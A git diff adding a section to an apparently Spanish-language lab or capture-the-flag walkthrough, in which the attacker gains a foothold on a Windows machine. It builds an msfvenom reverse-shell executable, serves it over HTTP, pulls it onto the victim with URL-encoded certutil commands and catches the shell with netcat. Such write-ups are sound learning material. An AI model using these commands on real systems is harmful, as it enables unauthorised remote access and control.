@@ -152,3 +152,62 @@ curl -sX GET "http://192.168.1.46/page.php?i=c:\xampp\apache\logs\techro-events\
 ![TECH](images/tech/17.png)
 
 ![TECH](images/tech/18.png)
+
+
+
+## OBTENIENDO ACCCESO A LA MAQUINA VICTIMA
+
+Parece que si se ejecutan, ahora nos vamos a nuestra maquina atacante y vamos a crear un archivo para mandarnos una reverse, recordamos que es windows x64:
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.47 LPORT=446 -a x64 -f exe -o shell.exe
+```
+
+![TECH](images/tech/19.png)
+
+
+
+levantamos un servidor con python donde hemos creado el shell.exe:
+
+```bash
+python3 -m http.server 80
+```
+
+![TECH](images/tech/20png.png)
+
+y mediante 
+```
+certutil -urlcache -f http://192.168.1.47/shell.exe C:\Windows\Temp\shell.exe
+```
+
+vamos a alojar el archivo en C:\Windows\Temp\
+
+pero hay que encodearlo:
+
+```
+certutil+-urlcache+-f+http%3A%2F%2F192.168.1.47%2Fshell.exe+C%3A%5CWindows%5CTemp%5Cshell.exe
+```
+![TECH](images/tech/21.png)
+
+comprobamos que se ha subido con:
+```bash
+dir C:\Windows\Temp
+```
+pero hay que encodear de nuevo
+```bash
+dir+C%3A%5CWindows%5CTemp
+```
+
+
+![TECH](images/tech/22.png)
+
+![TECH](images/tech/23.png)
+
+
+ahora nos ponemos en escucha por e puerto 446:
+
+```bash
+rlwrap nc -lvnp 446
+```
+
+![TECH](images/tech/24.png)
